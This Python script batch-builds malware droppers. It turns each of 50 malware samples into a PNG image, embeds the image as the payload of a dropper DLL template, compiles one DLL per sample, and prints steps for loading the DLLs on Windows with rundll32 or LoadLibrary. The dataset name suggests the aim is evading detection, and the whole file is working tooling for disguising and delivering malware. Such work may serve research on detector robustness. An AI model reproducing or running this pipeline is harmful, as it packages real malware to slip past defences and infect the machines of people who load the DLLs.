#!/usr/bin/env python3
"""
Complete PNG-embedded dropper batch processor
Processes all 50 malware samples and builds dropper DLLs
"""

import sys
import os
import shutil
import subprocess
from pathlib import Path
import time

def create_full_png_droppers():
    """
    Process all 50 binaries and create PNG-embedded dropper DLLs
    """
    
    # Paths
    source_dataset = Path("/home/mihir/Downloads/to_be_evaded_ds_unpacked")
    dropper_dir = Path("/home/mihir/Dropper")
    image_dll_template = dropper_dir / "image.dll" / "Dropper"
    utils_dir = dropper_dir / "utils"
    
    # NEW: Output directory for all 50 samples (no encoding version)
    output_dir = dropper_dir / "png_droppers_no_encoding"
    temp_build_dir = output_dir / "build_temp"
    
    # Clean and create directories
    if output_dir.exists():
        print(f"🗑️  Cleaning existing directory: {output_dir}")
        shutil.rmtree(output_dir)
    
    output_dir.mkdir(exist_ok=True)
    temp_build_dir.mkdir(exist_ok=True)
    
    print(f"📁 Created output directory: {output_dir}")
    print(f"📁 Created temp build directory: {temp_build_dir}")
    
    if not source_dataset.exists():
        print(f"❌ Source dataset not found at {source_dataset}")
        return False
    
    if not image_dll_template.exists():
        print(f"❌ Dropper template not found at {image_dll_template}")
        return False
        
    # Get all binary files from dataset (excluding sha256sums.txt)
    binary_files = []
    for item in source_dataset.iterdir():
        if item.is_file() and item.name != "sha256sums.txt":
            binary_files.append(item)
    
    binary_files.sort(key=lambda x: int(x.name))  # Sort numerically
    
    print(f"🔍 Found {len(binary_files)} binary files to process")
    print(f"📋 Processing samples: {[f.name for f in binary_files[:10]]}{'...' if len(binary_files) > 10 else ''}")
    
    successful = 0
    failed = 0
    start_time = time.time()
    
    for i, binary_file in enumerate(binary_files):
        sample_name = binary_file.name
        print(f"\n[{i+1}/{len(binary_files)}] 🔄 Processing sample: {sample_name}")
        
        try:
            # Step 1: Convert binary to PNG
            png_file = temp_build_dir / f"{sample_name}.png"
            print(f"  🖼️  Converting to PNG...")
            result = subprocess.run([
                sys.executable, 
                str(utils_dir / "pe_to_image.py"),
                str(binary_file),
                str(png_file)
            ], capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"  ❌ PNG conversion failed: {result.stderr.strip()}")
                failed += 1
                continue
            
            # Step 2: Create dropper build directory
            sample_build_dir = temp_build_dir / f"dropper_{sample_name}"
            if sample_build_dir.exists():
                shutil.rmtree(sample_build_dir)
            
            # Copy dropper template
            shutil.copytree(image_dll_template, sample_build_dir)
            
            # Step 3: Copy the PNG as payload and simplified source
            payload_png = sample_build_dir / "payload.png"
            shutil.copy2(png_file, payload_png)
            
            # Copy the working simplified source
            simplified_source = dropper_dir / "png_embedded_samples" / "dropper_2" / "Source_Simple.cpp"
            shutil.copy2(simplified_source, sample_build_dir / "Source_Simple.cpp")
            
            print(f"  📦 Build directory ready: {sample_build_dir}")
            
            # Step 4: Build the DLL
            print(f"  🔨 Building DLL...")
            build_result = subprocess.run([
                str(utils_dir / "build_single_dropper.sh"),
                sample_name,
                str(sample_build_dir),
                str(output_dir)
            ], capture_output=True, text=True)
            
            if build_result.returncode == 0:
                dll_file = output_dir / f"dropper_{sample_name}.dll"
                if dll_file.exists():
                    dll_size = dll_file.stat().st_size
                    print(f"  ✅ DLL built successfully: {dll_size:,} bytes")
                    successful += 1
                else:
                    print(f"  ❌ DLL build completed but file not found")
                    failed += 1
            else:
                print(f"  ❌ DLL build failed: {build_result.stderr.strip()}")
                failed += 1
            
            # Clean up temp files to save space
            if png_file.exists():
                png_file.unlink()
            if sample_build_dir.exists():
                shutil.rmtree(sample_build_dir)
                
        except Exception as e:
            print(f"  ❌ Error processing {sample_name}: {e}")
            failed += 1
    
    # Final statistics
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\n" + "="*60)
    print(f"📊 BATCH PROCESSING COMPLETE")
    print(f"="*60)
    print(f"🎯 Total samples processed: {successful + failed}")
    print(f"✅ Successful builds: {successful}")
    print(f"❌ Failed builds: {failed}")
    print(f"⏱️  Total time: {duration:.1f} seconds")
    print(f"📂 Output directory: {output_dir}")
    
    if successful > 0:
        print(f"\n📋 Generated DLL files:")
        dll_files = sorted(output_dir.glob("*.dll"))
        for dll in dll_files[:10]:  # Show first 10
            size = dll.stat().st_size
            print(f"  📦 {dll.name}: {size:,} bytes")
        if len(dll_files) > 10:
            print(f"  ... and {len(dll_files) - 10} more")
            
        print(f"\n🎉 SUCCESS! Generated {successful} PNG-embedded dropper DLLs")
        print(f"\n📝 Usage Instructions:")
        print(f"  1. Copy DLL files to Windows machine")
        print(f"  2. Load with: rundll32.exe dropper_<sample>.dll,DllMain")
        print(f"  3. Or use LoadLibrary() programmatically")
    
    # Clean up temp directory
    if temp_build_dir.exists():
        shutil.rmtree(temp_build_dir)
    
    return successful > 0

if __name__ == "__main__":
    print("🚀 Starting FULL PNG-embedded dropper batch processing...")
    print("📊 This will process ALL 50 malware samples")
    
    success = create_full_png_droppers()
    
    if success:
        print("\n🎉 COMPLETE! All PNG-embedded droppers ready!")
    else:
        print("\n💥 FAILED! Check errors above.")
        sys.exit(1)